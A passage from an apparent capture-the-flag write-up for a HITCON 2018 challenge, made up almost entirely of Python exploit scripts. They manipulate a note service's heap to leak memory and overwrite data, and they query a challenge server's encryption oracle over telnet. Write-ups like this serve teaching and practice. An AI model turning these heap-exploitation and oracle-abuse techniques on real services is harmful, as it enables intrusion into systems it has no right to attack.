        add(i, 1, 0x10*i - 13, 'a'*(0x10*i - 13)) 
    add(7, 2, 96, 'a'*96)

# exhaust unsorted bin
    for i in range(7):
        x = show(7)
    for i in range(8-3):
        show(3)
    for i in range(6):
        X = show(4).strip()
    for i in range(5):
        show(5)

#X = show(4).strip()
    #print X
    blocks = [0]*4
    for i in range(4):
        blocks[i] = int(X[32*i:32*(i+1)], 16)
        #print '%x' % blocks[i]

#show(2)
#show(2)
    payload = N^blocks[1]
    payload = ('%032x' % payload).decode('hex')
    delete(2)
    add(2, 1, 0x30, 'a'*0x20+payload)
    show(2)
    xx = show(1).strip()
    #print x
    print xx
    a += [xx]
    #raw_input("@%d" % N)
    r.close()

pickle.dump(a, f)

```
* CRT

```python
import telnetlib
import codecs
import gmpy2
import pickle
from tqdm import tqdm, trange

r = telnetlib.Telnet('52.194.203.194', 21700)
# r = telnetlib.Telnet('127.0.0.1', 20974)
rline = lambda: r.read_until(b'\n')[:-1]
tohex = lambda x: codecs.encode(x, 'hex')
fromhex = lambda x: codecs.decode(x, 'hex')
xor = lambda a, b: bytes(ai ^ bi for ai, bi in zip(a, b))

def rawenc(s):
    r.write(b'1\n') # Add note
    r.write(b'3\n') # index
    r.write(b'1\n') # Type
    r.write(f'{len(s)}\n'.encode('ascii')) # size
    r.write(s)
    r.write(b'2\n') # Show note
    r.write(b'3\n') # index
    r.read_until(b'index:')
    r.read_until(b'index:')
    res = None
    try:
        l = rline()
        res = codecs.decode(l, 'hex')
    except:
        print(l)
        raise
    r.write(b'3\n') # Remove note
    r.write(b'3\n') # index
    r.read_until(b'index:')
    return res

enciv = rawenc(b'\0' * 17)[:16]

def enc(s):
    s = b'\0' * 16 + xor(enciv, s[:16]) + s[16:]
    return rawenc(s)[16:]

i = 1
arr = []
with open('o.pkl', 'rb') as f:
    arr = pickle.load(f)
for i in trange(len(arr), 300):
    plain = i.to_bytes(16, 'big')
    plain += b'\x10' * 16 + b'\x10'
    overflow = enc(plain)[:32][-4:]
    arr.append(tohex(overflow).decode('ascii'))
    with open('o.pkl', 'wb') as f:
        pickle.dump(arr, f)
# for i in trange(0, 300, desc='checking'):
    # plain = i.to_bytes(16, 'big')
    # plain += b'\x10' * 16 + b'\x10'
    # overflow = enc(plain)[:32][-4:]
    # assert(arr[i] == tohex(overflow).decode('ascii'))
print(arr)
# r.interact()

```
* Get flag

```python
```

---

*Truncated at 1200 lines. Full text: <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20181019-hitconctf/README.md>*
